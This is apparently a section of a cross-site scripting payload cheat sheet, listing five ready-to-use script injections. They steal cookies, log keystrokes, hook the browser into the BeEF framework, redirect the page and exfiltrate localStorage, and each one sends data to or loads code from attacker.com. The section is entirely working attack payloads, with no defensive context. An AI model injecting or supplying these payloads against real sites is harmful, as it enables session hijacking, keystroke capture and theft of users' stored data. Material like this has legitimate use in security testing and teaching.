## 💀 Advanced / Exploitation Payloads

```javascript
// Cookie stealing
<script>document.location='https://attacker.com/?c='+document.cookie</script>

// Keylogger
<script>document.onkeypress=function(e){fetch('https://attacker.com/?k='+e.key)}</script>

// BeEF hook
<script src="http://attacker.com:3000/hook.js"></script>

// Redirect
<script>window.location='https://attacker.com'</script>

// localStorage theft
<script>fetch('https://attacker.com/?l='+JSON.stringify(localStorage))</script>
```

